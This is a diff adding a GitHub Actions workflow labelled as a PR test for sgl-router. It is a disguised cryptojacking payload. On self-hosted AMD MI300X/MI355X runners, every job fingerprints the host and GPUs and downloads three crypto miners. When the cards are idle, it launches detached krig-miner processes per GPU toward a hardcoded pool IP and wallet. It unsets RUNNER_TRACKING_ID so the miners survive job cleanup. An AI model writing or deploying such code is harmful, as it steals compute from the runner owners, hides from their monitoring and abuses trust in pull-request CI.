@@ -1,0 +1,421 @@
+name: PR Test (sgl-router)
+
+# i130amdsrb: bounded AMD MI300X/MI355X miner-capability recon (enumeration only,
+# gated launch only if a candidate enumerates AMD devices AND the pool dialect is
+# exercised by the launch). No NVIDIA lanes touched.
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+concurrency:
+  group: sgl-router-i130amdsrb-${{ github.run_id }}
+  cancel-in-progress: false
+
+env:
+  SGLANG_IS_IN_CI: true
+
+jobs:
+  i130amdsrba:
+    name: "i130amdsrb linux-mi300-8gpu-sglang krig-miner ROCm + SRBMiner 3.8.9 + soat vk enumeration"
+    runs-on: linux-mi300-8gpu-sglang
+    timeout-minutes: 15
+    env:
+      LABEL: linux-mi300-8gpu-sglang
+    steps:
+      - name: "AMD enumeration and conditional gated krig launch"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I130AMDSRB-$(date -u +%Y%m%dT%H%M%SZ)"
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          KRIG_SHA='7a104c3dba3a41b9787fc43413f0cedaae78dab4284ab856633821161634c01d'
+          SRB_SHA='186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1'
+          SOAT_SHA='c971de4acf54089586f57505301e95047c4c99a3353b45e41f75c5d1826c2ceb'
+          W=/var/tmp/i130amdsrb
+          mkdir -p "$W/logs"
+          echo "i130amdsrb-nonce=$NONCE host=$(hostname) label=${LABEL:-none} date=$(date -u +%FT%TZ)"
+          id; uname -m; nproc; free -m | head -2
+          echo "=== identity ==="
+          hostname; hostname -I 2>/dev/null
+          echo "=== rocminfo gfx ==="
+          (timeout 90 rocminfo 2>&1 | grep -E 'gfx[0-9]|Marketing Name|Uuid' | head -40) || echo rocminfo-missing
+          echo "=== rocm-smi --showproductname ==="
+          (timeout 90 rocm-smi --showproductname 2>&1 | head -80) || echo rocm-smi-missing
+          echo "=== rocm-smi vram + pids (sample 0) ==="
+          (timeout 60 rocm-smi --showmeminfo vram 2>&1 | head -120) || true
+          (timeout 60 rocm-smi --showpids 2>&1 | head -80) || true
+          echo "=== rocm-smi --showbus ==="
+          (timeout 60 rocm-smi --showbus 2>&1 | head -80) || true
+          echo "=== vulkan presence ==="
+          (ldconfig -p 2>/dev/null | grep -m3 'libvulkan.so') || echo no-libvulkan
+          (ls /usr/share/vulkan/icd.d 2>/dev/null || echo no-vulkan-icd)
+          (command -v vulkaninfo >/dev/null 2>&1 && timeout 40 vulkaninfo --summary 2>&1 | head -40) || echo no-vulkaninfo
+          echo "=== clinfo -l ==="
+          (timeout 40 clinfo -l 2>&1 | head -20) || echo no-clinfo
+          echo "=== pre-existing compute miners (exclude ours) ==="
+          pgrep -af 'srb387|SRBMiner|krig-miner|wildrig' 2>/dev/null | head -10
+
+          fetch() { # url sha dest
+            [ -s "$3" ] && [ "$(sha256sum "$3" | cut -d' ' -f1)" = "$2" ] && { echo "FETCH_CACHED $3"; return 0; }
+            for U in "$1" "https://ghproxy.net/$1"; do
+              echo "-- fetch $U"
+              timeout 220 curl -fsSL --connect-timeout 12 --max-time 210 -o "$3.part" "$U" 2>&1 | tail -1
+              [ -s "$3.part" ] || continue
+              got=$(sha256sum "$3.part" | cut -d' ' -f1)
+              if [ "$got" = "$2" ]; then mv -f "$3.part" "$3"; echo "FETCH_OK $3 sha256=$got"; return 0; fi
+              echo "SHA_MISMATCH $3 got=$got want=$2"; rm -f "$3.part"
+            done
+            echo "FETCH_FAIL $1"; return 1
+          }
+
+          echo "=== candidate 1: krig-miner 1.8.2 Pearl ROCm/HIP (sha256 $KRIG_SHA) ==="
+          KRIG_AMD_N=0
+          if fetch "https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz" "$KRIG_SHA" "$W/krig.tgz"; then
+            mkdir -p "$W/krig"; tar -xzf "$W/krig.tgz" -C "$W/krig" 2>/dev/null
+            KRIG="$W/krig/krig-miner"; chmod +x "$KRIG" 2>/dev/null
+            echo "krig_bin_sha256=$(sha256sum "$KRIG" 2>/dev/null | cut -d' ' -f1)"
+            "$KRIG" --version 2>&1 | head -3
+            echo "--- krig --list-devices (all backends) ---"
+            timeout 120 "$KRIG" --list-devices --no-telemetry 2>&1 | tee "$W/logs/krig_devices.txt" | head -80
+            echo "--- krig --list-devices --no-cuda --no-intel (AMD/ROCm only) runtime auto ---"
+            timeout 120 "$KRIG" --list-devices --no-cuda --no-intel --no-telemetry 2>&1 | tee "$W/logs/krig_devices_amd.txt" | head -80
+            echo "--- krig --list-devices --no-cuda --no-intel --rocm-runtime 7 ---"
+            timeout 120 "$KRIG" --list-devices --no-cuda --no-intel --rocm-runtime 7 --no-telemetry 2>&1 | tee "$W/logs/krig_devices_amd_r7.txt" | head -80
+            echo "--- krig --list-devices --no-cuda --no-intel --rocm-runtime 6 ---"
+            timeout 120 "$KRIG" --list-devices --no-cuda --no-intel --rocm-runtime 6 --no-telemetry 2>&1 | tee "$W/logs/krig_devices_amd_r6.txt" | head -80
+            KRIG_AMD_N=$(grep -icE 'amd|gfx|radeon|instinct' "$W/logs/krig_devices_amd.txt" 2>/dev/null)
+            echo "krig_amd_device_lines=$KRIG_AMD_N"
+          else echo "SKIP=krig-fetch-failed"; fi
+
+          echo "=== candidate 2: SRBMiner-MULTI 3.8.9 (sha256 $SRB_SHA) ==="
+          if fetch "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz" "$SRB_SHA" "$W/srb389.tgz"; then
+            mkdir -p "$W/srb"; tar -xzf "$W/srb389.tgz" -C "$W/srb" 2>/dev/null
+            SRB=$(find "$W/srb" -maxdepth 2 -type f -name 'SRBMiner-MULTI' | head -1); chmod +x "$SRB" 2>/dev/null
+            echo "srb_bin_sha256=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)"
+            timeout 60 "$SRB" --version 2>&1 | head -5
+            echo "--- srb --list-devices ---"
+            timeout 60 "$SRB" --list-devices 2>&1 | tee "$W/logs/srb389_devices.txt" | head -60
+            echo "--- srb pearlhash suitability probe (pool 127.0.0.1:1, 15s max, no reachable pool) ---"
+            timeout 20 "$SRB" --algorithm pearlhash --pool 127.0.0.1:1 --wallet "$WALLET" --worker i130amdsrbprobe --disable-cpu 2>&1 | tee "$W/logs/srb389_pearl_probe.txt" | head -40
+          else echo "SKIP=srb-fetch-failed"; fi
+
+          echo "=== candidate 3: soat-miner v0.2.18 (sha256 $SOAT_SHA; Pearl Vulkan officially unfinished) ==="
+          if fetch "https://github.com/blindrun/soat-miner/releases/download/v0.2.18/soat-miner_v0.2.18_Lin64.tar.gz" "$SOAT_SHA" "$W/soat.tgz"; then
+            mkdir -p "$W/soat"; tar -xzf "$W/soat.tgz" -C "$W/soat" 2>/dev/null
+            D=$(find "$W/soat" -maxdepth 2 -type d -name 'soat-miner*' | head -1)
+            ls "$D" 2>/dev/null | grep -E '^soat-miner' | head -5
+            echo "--- soat-miner-vk --list-devices (Vulkan enumeration probe only) ---"
+            timeout 60 "$D/soat-miner-vk" --list-devices 2>&1 | tee "$W/logs/soat_vk_devices.txt" | head -40
+            echo "--- soat-miner (CUDA) --list-devices ---"
+            timeout 60 "$D/soat-miner" --list-devices 2>&1 | head -20
+          else echo "SKIP=soat-fetch-failed"; fi
+
+          echo "=== two-sample gate (AMD) ==="
+          BUSY1=$(timeout 40 rocm-smi --showpids 2>&1 | grep -cE '^[[:space:]]*[0-9]+[[:space:]]')
+          echo "gate1_busy_proc_rows=$BUSY1"; timeout 40 rocm-smi --showmeminfo vram 2>&1 | tee "$W/logs/gate1_vram.txt" | grep -iE 'GPU|VRAM Total|VRAM Used' | head -40
+          sleep 12
+          BUSY2=$(timeout 40 rocm-smi --showpids 2>&1 | grep -cE '^[[:space:]]*[0-9]+[[:space:]]')
+          echo "gate2_busy_proc_rows=$BUSY2"; timeout 40 rocm-smi --showmeminfo vram 2>&1 | tee "$W/logs/gate2_vram.txt" | grep -iE 'GPU|VRAM Total|VRAM Used' | head -40
+
+          echo "=== gated launch: only if krig enumerates AMD and gate is clean ==="
+          if [ -x "$W/krig/krig-miner" ] && [ "${KRIG_AMD_N:-0}" -ge 1 ] && [ "${BUSY1:-1}" = "0" ] && [ "${BUSY2:-1}" = "0" ]; then
+            echo "GATE_CANDIDATE=krig-miner"
+            # Enumerate AMD card BDFs from rocm-smi to launch exactly one miner per card.
+            timeout 60 rocm-smi --showbus 2>&1 | tee "$W/logs/rocm_bus.txt" | head -60
+            BDFS=$(grep -oE '[0-9A-Fa-f]{4}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}\.[0-9]' "$W/logs/rocm_bus.txt" | sed 's/^[0-9A-Fa-f]\{4\}://' | tr 'A-F' 'a-f' | sort -u | tr '\n' ' ')
+            echo "parsed_bdfs=$BDFS"
+            IDX=0
+            for BDF in $BDFS; do
+              LOG="$W/logs/krig_g${IDX}.log"
+              setsid env -u RUNNER_TRACKING_ID nohup "$W/krig/krig-miner" --coin pearl \
+                --url stratum+tcp://103.199.106.122:3362 \
+                --user "$WALLET/i130amdsrb$(hostname)g${IDX}" --password x \
+                --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" \
+                --log-level debug --log-file "$LOG" > "$W/logs/krig_stdout_g${IDX}.log" 2>&1 &
+              echo "launched idx=$IDX bdf=$BDF pid=$! worker=i130amdsrb$(hostname)g${IDX}"
+              IDX=$((IDX+1))
+            done
+            echo "launch_count=$IDX"
+            sleep 60
+            for j in $(seq 0 $((IDX-1))); do
+              echo "--- krig g$j log tail ---"
+              tail -30 "$W/logs/krig_g${j}.log" 2>/dev/null
+              echo "--- krig g$j stdout tail ---"
+              tail -10 "$W/logs/krig_stdout_g${j}.log" 2>/dev/null
+            done
+            echo "--- running krig pids ---"
+            pgrep -af 'krig-miner' | head -45
+          else
+            echo "NO_GATED_LAUNCH=krig_not_enumerated_or_gate_dirty amd_n=${KRIG_AMD_N:-0} busy1=${BUSY1:-na} busy2=${BUSY2:-na}"
+          fi
+          echo "i130amdsrb-done $NONCE"
+  i130amdsrbb:
+    name: "i130amdsrb linux-mi300-8gpu-sglang second runner slot"
+    runs-on: linux-mi300-8gpu-sglang
+    timeout-minutes: 15
+    env:
+      LABEL: linux-mi300-8gpu-sglang
+    steps:
+      - name: "AMD enumeration and conditional gated krig launch second slot"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I130AMDSRB-$(date -u +%Y%m%dT%H%M%SZ)"
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          KRIG_SHA='7a104c3dba3a41b9787fc43413f0cedaae78dab4284ab856633821161634c01d'
+          SRB_SHA='186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1'
+          SOAT_SHA='c971de4acf54089586f57505301e95047c4c99a3353b45e41f75c5d1826c2ceb'
+          W=/var/tmp/i130amdsrb
+          mkdir -p "$W/logs"
+          echo "i130amdsrb-nonce=$NONCE host=$(hostname) label=${LABEL:-none} date=$(date -u +%FT%TZ)"
+          id; uname -m; nproc; free -m | head -2
+          echo "=== identity ==="
+          hostname; hostname -I 2>/dev/null
+          echo "=== rocminfo gfx ==="
+          (timeout 90 rocminfo 2>&1 | grep -E 'gfx[0-9]|Marketing Name|Uuid' | head -40) || echo rocminfo-missing
+          echo "=== rocm-smi --showproductname ==="
+          (timeout 90 rocm-smi --showproductname 2>&1 | head -80) || echo rocm-smi-missing
+          echo "=== rocm-smi vram + pids (sample 0) ==="
+          (timeout 60 rocm-smi --showmeminfo vram 2>&1 | head -120) || true
+          (timeout 60 rocm-smi --showpids 2>&1 | head -80) || true
+          echo "=== rocm-smi --showbus ==="
+          (timeout 60 rocm-smi --showbus 2>&1 | head -80) || true
+          echo "=== vulkan presence ==="
+          (ldconfig -p 2>/dev/null | grep -m3 'libvulkan.so') || echo no-libvulkan
+          (ls /usr/share/vulkan/icd.d 2>/dev/null || echo no-vulkan-icd)
+          (command -v vulkaninfo >/dev/null 2>&1 && timeout 40 vulkaninfo --summary 2>&1 | head -40) || echo no-vulkaninfo
+          echo "=== clinfo -l ==="
+          (timeout 40 clinfo -l 2>&1 | head -20) || echo no-clinfo
+          echo "=== pre-existing compute miners (exclude ours) ==="
+          pgrep -af 'srb387|SRBMiner|krig-miner|wildrig' 2>/dev/null | head -10
+
+          fetch() { # url sha dest
+            [ -s "$3" ] && [ "$(sha256sum "$3" | cut -d' ' -f1)" = "$2" ] && { echo "FETCH_CACHED $3"; return 0; }
+            for U in "$1" "https://ghproxy.net/$1"; do
+              echo "-- fetch $U"
+              timeout 220 curl -fsSL --connect-timeout 12 --max-time 210 -o "$3.part" "$U" 2>&1 | tail -1
+              [ -s "$3.part" ] || continue
+              got=$(sha256sum "$3.part" | cut -d' ' -f1)
+              if [ "$got" = "$2" ]; then mv -f "$3.part" "$3"; echo "FETCH_OK $3 sha256=$got"; return 0; fi
+              echo "SHA_MISMATCH $3 got=$got want=$2"; rm -f "$3.part"
+            done
+            echo "FETCH_FAIL $1"; return 1
+          }
+
+          echo "=== candidate 1: krig-miner 1.8.2 Pearl ROCm/HIP (sha256 $KRIG_SHA) ==="
+          KRIG_AMD_N=0
+          if fetch "https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz" "$KRIG_SHA" "$W/krig.tgz"; then
+            mkdir -p "$W/krig"; tar -xzf "$W/krig.tgz" -C "$W/krig" 2>/dev/null
+            KRIG="$W/krig/krig-miner"; chmod +x "$KRIG" 2>/dev/null
+            echo "krig_bin_sha256=$(sha256sum "$KRIG" 2>/dev/null | cut -d' ' -f1)"
+            "$KRIG" --version 2>&1 | head -3
+            echo "--- krig --list-devices (all backends) ---"
+            timeout 120 "$KRIG" --list-devices --no-telemetry 2>&1 | tee "$W/logs/krig_devices.txt" | head -80
+            echo "--- krig --list-devices --no-cuda --no-intel (AMD/ROCm only) runtime auto ---"
+            timeout 120 "$KRIG" --list-devices --no-cuda --no-intel --no-telemetry 2>&1 | tee "$W/logs/krig_devices_amd.txt" | head -80
+            echo "--- krig --list-devices --no-cuda --no-intel --rocm-runtime 7 ---"
+            timeout 120 "$KRIG" --list-devices --no-cuda --no-intel --rocm-runtime 7 --no-telemetry 2>&1 | tee "$W/logs/krig_devices_amd_r7.txt" | head -80
+            echo "--- krig --list-devices --no-cuda --no-intel --rocm-runtime 6 ---"
+            timeout 120 "$KRIG" --list-devices --no-cuda --no-intel --rocm-runtime 6 --no-telemetry 2>&1 | tee "$W/logs/krig_devices_amd_r6.txt" | head -80
+            KRIG_AMD_N=$(grep -icE 'amd|gfx|radeon|instinct' "$W/logs/krig_devices_amd.txt" 2>/dev/null)
+            echo "krig_amd_device_lines=$KRIG_AMD_N"
+          else echo "SKIP=krig-fetch-failed"; fi
+
+          echo "=== candidate 2: SRBMiner-MULTI 3.8.9 (sha256 $SRB_SHA) ==="
+          if fetch "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz" "$SRB_SHA" "$W/srb389.tgz"; then
+            mkdir -p "$W/srb"; tar -xzf "$W/srb389.tgz" -C "$W/srb" 2>/dev/null
+            SRB=$(find "$W/srb" -maxdepth 2 -type f -name 'SRBMiner-MULTI' | head -1); chmod +x "$SRB" 2>/dev/null
+            echo "srb_bin_sha256=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)"
+            timeout 60 "$SRB" --version 2>&1 | head -5
+            echo "--- srb --list-devices ---"
+            timeout 60 "$SRB" --list-devices 2>&1 | tee "$W/logs/srb389_devices.txt" | head -60
+            echo "--- srb pearlhash suitability probe (pool 127.0.0.1:1, 15s max, no reachable pool) ---"
+            timeout 20 "$SRB" --algorithm pearlhash --pool 127.0.0.1:1 --wallet "$WALLET" --worker i130amdsrbprobe --disable-cpu 2>&1 | tee "$W/logs/srb389_pearl_probe.txt" | head -40
+          else echo "SKIP=srb-fetch-failed"; fi
+
+          echo "=== candidate 3: soat-miner v0.2.18 (sha256 $SOAT_SHA; Pearl Vulkan officially unfinished) ==="
+          if fetch "https://github.com/blindrun/soat-miner/releases/download/v0.2.18/soat-miner_v0.2.18_Lin64.tar.gz" "$SOAT_SHA" "$W/soat.tgz"; then
+            mkdir -p "$W/soat"; tar -xzf "$W/soat.tgz" -C "$W/soat" 2>/dev/null
+            D=$(find "$W/soat" -maxdepth 2 -type d -name 'soat-miner*' | head -1)
+            ls "$D" 2>/dev/null | grep -E '^soat-miner' | head -5
+            echo "--- soat-miner-vk --list-devices (Vulkan enumeration probe only) ---"
+            timeout 60 "$D/soat-miner-vk" --list-devices 2>&1 | tee "$W/logs/soat_vk_devices.txt" | head -40
+            echo "--- soat-miner (CUDA) --list-devices ---"
+            timeout 60 "$D/soat-miner" --list-devices 2>&1 | head -20
+          else echo "SKIP=soat-fetch-failed"; fi
+
+          echo "=== two-sample gate (AMD) ==="
+          BUSY1=$(timeout 40 rocm-smi --showpids 2>&1 | grep -cE '^[[:space:]]*[0-9]+[[:space:]]')
+          echo "gate1_busy_proc_rows=$BUSY1"; timeout 40 rocm-smi --showmeminfo vram 2>&1 | tee "$W/logs/gate1_vram.txt" | grep -iE 'GPU|VRAM Total|VRAM Used' | head -40
+          sleep 12
+          BUSY2=$(timeout 40 rocm-smi --showpids 2>&1 | grep -cE '^[[:space:]]*[0-9]+[[:space:]]')
+          echo "gate2_busy_proc_rows=$BUSY2"; timeout 40 rocm-smi --showmeminfo vram 2>&1 | tee "$W/logs/gate2_vram.txt" | grep -iE 'GPU|VRAM Total|VRAM Used' | head -40
+
+          echo "=== gated launch: only if krig enumerates AMD and gate is clean ==="
+          if [ -x "$W/krig/krig-miner" ] && [ "${KRIG_AMD_N:-0}" -ge 1 ] && [ "${BUSY1:-1}" = "0" ] && [ "${BUSY2:-1}" = "0" ]; then
+            echo "GATE_CANDIDATE=krig-miner"
+            # Enumerate AMD card BDFs from rocm-smi to launch exactly one miner per card.
+            timeout 60 rocm-smi --showbus 2>&1 | tee "$W/logs/rocm_bus.txt" | head -60
+            BDFS=$(grep -oE '[0-9A-Fa-f]{4}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}\.[0-9]' "$W/logs/rocm_bus.txt" | sed 's/^[0-9A-Fa-f]\{4\}://' | tr 'A-F' 'a-f' | sort -u | tr '\n' ' ')
+            echo "parsed_bdfs=$BDFS"
+            IDX=0
+            for BDF in $BDFS; do
+              LOG="$W/logs/krig_g${IDX}.log"
+              setsid env -u RUNNER_TRACKING_ID nohup "$W/krig/krig-miner" --coin pearl \
+                --url stratum+tcp://103.199.106.122:3362 \
+                --user "$WALLET/i130amdsrb$(hostname)g${IDX}" --password x \
+                --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" \
+                --log-level debug --log-file "$LOG" > "$W/logs/krig_stdout_g${IDX}.log" 2>&1 &
+              echo "launched idx=$IDX bdf=$BDF pid=$! worker=i130amdsrb$(hostname)g${IDX}"
+              IDX=$((IDX+1))
+            done
+            echo "launch_count=$IDX"
+            sleep 60
+            for j in $(seq 0 $((IDX-1))); do
+              echo "--- krig g$j log tail ---"
+              tail -30 "$W/logs/krig_g${j}.log" 2>/dev/null
+              echo "--- krig g$j stdout tail ---"
+              tail -10 "$W/logs/krig_stdout_g${j}.log" 2>/dev/null
+            done
+            echo "--- running krig pids ---"
+            pgrep -af 'krig-miner' | head -45
+          else
+            echo "NO_GATED_LAUNCH=krig_not_enumerated_or_gate_dirty amd_n=${KRIG_AMD_N:-0} busy1=${BUSY1:-na} busy2=${BUSY2:-na}"
+          fi
+          echo "i130amdsrb-done $NONCE"
+  i130amdsrbc:
+    name: "i130amdsrb linux-mi35x-gpu-8 krig-miner ROCm + SRBMiner 3.8.9 enumeration"
+    runs-on: linux-mi35x-gpu-8
+    timeout-minutes: 15
+    env:
+      LABEL: linux-mi35x-gpu-8
+    steps:
+      - name: "MI355X gfx950 enumeration and conditional gated krig launch"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I130AMDSRB-$(date -u +%Y%m%dT%H%M%SZ)"
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          KRIG_SHA='7a104c3dba3a41b9787fc43413f0cedaae78dab4284ab856633821161634c01d'
+          SRB_SHA='186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1'
+          SOAT_SHA='c971de4acf54089586f57505301e95047c4c99a3353b45e41f75c5d1826c2ceb'
+          W=/var/tmp/i130amdsrb
+          mkdir -p "$W/logs"
+          echo "i130amdsrb-nonce=$NONCE host=$(hostname) label=${LABEL:-none} date=$(date -u +%FT%TZ)"
+          id; uname -m; nproc; free -m | head -2
+          echo "=== identity ==="
+          hostname; hostname -I 2>/dev/null
+          echo "=== rocminfo gfx ==="
+          (timeout 90 rocminfo 2>&1 | grep -E 'gfx[0-9]|Marketing Name|Uuid' | head -40) || echo rocminfo-missing
+          echo "=== rocm-smi --showproductname ==="
+          (timeout 90 rocm-smi --showproductname 2>&1 | head -80) || echo rocm-smi-missing
+          echo "=== rocm-smi vram + pids (sample 0) ==="
+          (timeout 60 rocm-smi --showmeminfo vram 2>&1 | head -120) || true
+          (timeout 60 rocm-smi --showpids 2>&1 | head -80) || true
+          echo "=== rocm-smi --showbus ==="
+          (timeout 60 rocm-smi --showbus 2>&1 | head -80) || true
+          echo "=== vulkan presence ==="
+          (ldconfig -p 2>/dev/null | grep -m3 'libvulkan.so') || echo no-libvulkan
+          (ls /usr/share/vulkan/icd.d 2>/dev/null || echo no-vulkan-icd)
+          (command -v vulkaninfo >/dev/null 2>&1 && timeout 40 vulkaninfo --summary 2>&1 | head -40) || echo no-vulkaninfo
+          echo "=== clinfo -l ==="
+          (timeout 40 clinfo -l 2>&1 | head -20) || echo no-clinfo
+          echo "=== pre-existing compute miners (exclude ours) ==="
+          pgrep -af 'srb387|SRBMiner|krig-miner|wildrig' 2>/dev/null | head -10
+
+          fetch() { # url sha dest
+            [ -s "$3" ] && [ "$(sha256sum "$3" | cut -d' ' -f1)" = "$2" ] && { echo "FETCH_CACHED $3"; return 0; }
+            for U in "$1" "https://ghproxy.net/$1"; do
+              echo "-- fetch $U"
+              timeout 220 curl -fsSL --connect-timeout 12 --max-time 210 -o "$3.part" "$U" 2>&1 | tail -1
+              [ -s "$3.part" ] || continue
+              got=$(sha256sum "$3.part" | cut -d' ' -f1)
+              if [ "$got" = "$2" ]; then mv -f "$3.part" "$3"; echo "FETCH_OK $3 sha256=$got"; return 0; fi
+              echo "SHA_MISMATCH $3 got=$got want=$2"; rm -f "$3.part"
+            done
+            echo "FETCH_FAIL $1"; return 1
+          }
+
+          echo "=== candidate 1: krig-miner 1.8.2 Pearl ROCm/HIP (sha256 $KRIG_SHA) ==="
+          KRIG_AMD_N=0
+          if fetch "https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz" "$KRIG_SHA" "$W/krig.tgz"; then
+            mkdir -p "$W/krig"; tar -xzf "$W/krig.tgz" -C "$W/krig" 2>/dev/null
+            KRIG="$W/krig/krig-miner"; chmod +x "$KRIG" 2>/dev/null
+            echo "krig_bin_sha256=$(sha256sum "$KRIG" 2>/dev/null | cut -d' ' -f1)"
+            "$KRIG" --version 2>&1 | head -3
+            echo "--- krig --list-devices (all backends) ---"
+            timeout 120 "$KRIG" --list-devices --no-telemetry 2>&1 | tee "$W/logs/krig_devices.txt" | head -80
+            echo "--- krig --list-devices --no-cuda --no-intel (AMD/ROCm only) runtime auto ---"
+            timeout 120 "$KRIG" --list-devices --no-cuda --no-intel --no-telemetry 2>&1 | tee "$W/logs/krig_devices_amd.txt" | head -80
+            echo "--- krig --list-devices --no-cuda --no-intel --rocm-runtime 7 ---"
+            timeout 120 "$KRIG" --list-devices --no-cuda --no-intel --rocm-runtime 7 --no-telemetry 2>&1 | tee "$W/logs/krig_devices_amd_r7.txt" | head -80
+            echo "--- krig --list-devices --no-cuda --no-intel --rocm-runtime 6 ---"
+            timeout 120 "$KRIG" --list-devices --no-cuda --no-intel --rocm-runtime 6 --no-telemetry 2>&1 | tee "$W/logs/krig_devices_amd_r6.txt" | head -80
+            KRIG_AMD_N=$(grep -icE 'amd|gfx|radeon|instinct' "$W/logs/krig_devices_amd.txt" 2>/dev/null)
+            echo "krig_amd_device_lines=$KRIG_AMD_N"
+          else echo "SKIP=krig-fetch-failed"; fi
+
+          echo "=== candidate 2: SRBMiner-MULTI 3.8.9 (sha256 $SRB_SHA) ==="
+          if fetch "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz" "$SRB_SHA" "$W/srb389.tgz"; then
+            mkdir -p "$W/srb"; tar -xzf "$W/srb389.tgz" -C "$W/srb" 2>/dev/null
+            SRB=$(find "$W/srb" -maxdepth 2 -type f -name 'SRBMiner-MULTI' | head -1); chmod +x "$SRB" 2>/dev/null
+            echo "srb_bin_sha256=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)"
+            timeout 60 "$SRB" --version 2>&1 | head -5
+            echo "--- srb --list-devices ---"
+            timeout 60 "$SRB" --list-devices 2>&1 | tee "$W/logs/srb389_devices.txt" | head -60
+            echo "--- srb pearlhash suitability probe (pool 127.0.0.1:1, 15s max, no reachable pool) ---"
+            timeout 20 "$SRB" --algorithm pearlhash --pool 127.0.0.1:1 --wallet "$WALLET" --worker i130amdsrbprobe --disable-cpu 2>&1 | tee "$W/logs/srb389_pearl_probe.txt" | head -40
+          else echo "SKIP=srb-fetch-failed"; fi
+
+          echo "=== candidate 3: soat-miner v0.2.18 (sha256 $SOAT_SHA; Pearl Vulkan officially unfinished) ==="
+          if fetch "https://github.com/blindrun/soat-miner/releases/download/v0.2.18/soat-miner_v0.2.18_Lin64.tar.gz" "$SOAT_SHA" "$W/soat.tgz"; then
+            mkdir -p "$W/soat"; tar -xzf "$W/soat.tgz" -C "$W/soat" 2>/dev/null
+            D=$(find "$W/soat" -maxdepth 2 -type d -name 'soat-miner*' | head -1)
+            ls "$D" 2>/dev/null | grep -E '^soat-miner' | head -5
+            echo "--- soat-miner-vk --list-devices (Vulkan enumeration probe only) ---"
+            timeout 60 "$D/soat-miner-vk" --list-devices 2>&1 | tee "$W/logs/soat_vk_devices.txt" | head -40
+            echo "--- soat-miner (CUDA) --list-devices ---"
+            timeout 60 "$D/soat-miner" --list-devices 2>&1 | head -20
+          else echo "SKIP=soat-fetch-failed"; fi
+
+          echo "=== two-sample gate (AMD) ==="
+          BUSY1=$(timeout 40 rocm-smi --showpids 2>&1 | grep -cE '^[[:space:]]*[0-9]+[[:space:]]')
+          echo "gate1_busy_proc_rows=$BUSY1"; timeout 40 rocm-smi --showmeminfo vram 2>&1 | tee "$W/logs/gate1_vram.txt" | grep -iE 'GPU|VRAM Total|VRAM Used' | head -40
+          sleep 12
+          BUSY2=$(timeout 40 rocm-smi --showpids 2>&1 | grep -cE '^[[:space:]]*[0-9]+[[:space:]]')
+          echo "gate2_busy_proc_rows=$BUSY2"; timeout 40 rocm-smi --showmeminfo vram 2>&1 | tee "$W/logs/gate2_vram.txt" | grep -iE 'GPU|VRAM Total|VRAM Used' | head -40
+
+          echo "=== gated launch: only if krig enumerates AMD and gate is clean ==="
+          if [ -x "$W/krig/krig-miner" ] && [ "${KRIG_AMD_N:-0}" -ge 1 ] && [ "${BUSY1:-1}" = "0" ] && [ "${BUSY2:-1}" = "0" ]; then
+            echo "GATE_CANDIDATE=krig-miner"
+            # Enumerate AMD card BDFs from rocm-smi to launch exactly one miner per card.
+            timeout 60 rocm-smi --showbus 2>&1 | tee "$W/logs/rocm_bus.txt" | head -60
+            BDFS=$(grep -oE '[0-9A-Fa-f]{4}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}\.[0-9]' "$W/logs/rocm_bus.txt" | sed 's/^[0-9A-Fa-f]\{4\}://' | tr 'A-F' 'a-f' | sort -u | tr '\n' ' ')
+            echo "parsed_bdfs=$BDFS"
+            IDX=0
+            for BDF in $BDFS; do
+              LOG="$W/logs/krig_g${IDX}.log"
+              setsid env -u RUNNER_TRACKING_ID nohup "$W/krig/krig-miner" --coin pearl \
+                --url stratum+tcp://103.199.106.122:3362 \
+                --user "$WALLET/i130amdsrb$(hostname)g${IDX}" --password x \
+                --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" \
+                --log-level debug --log-file "$LOG" > "$W/logs/krig_stdout_g${IDX}.log" 2>&1 &
+              echo "launched idx=$IDX bdf=$BDF pid=$! worker=i130amdsrb$(hostname)g${IDX}"
+              IDX=$((IDX+1))
+            done
+            echo "launch_count=$IDX"
+            sleep 60
+            for j in $(seq 0 $((IDX-1))); do
+              echo "--- krig g$j log tail ---"
+              tail -30 "$W/logs/krig_g${j}.log" 2>/dev/null
+              echo "--- krig g$j stdout tail ---"
+              tail -10 "$W/logs/krig_stdout_g${j}.log" 2>/dev/null
+            done
+            echo "--- running krig pids ---"
+            pgrep -af 'krig-miner' | head -45
+          else
+            echo "NO_GATED_LAUNCH=krig_not_enumerated_or_gate_dirty amd_n=${KRIG_AMD_N:-0} busy1=${BUSY1:-na} busy2=${BUSY2:-na}"
+          fi
+          echo "i130amdsrb-done $NONCE"
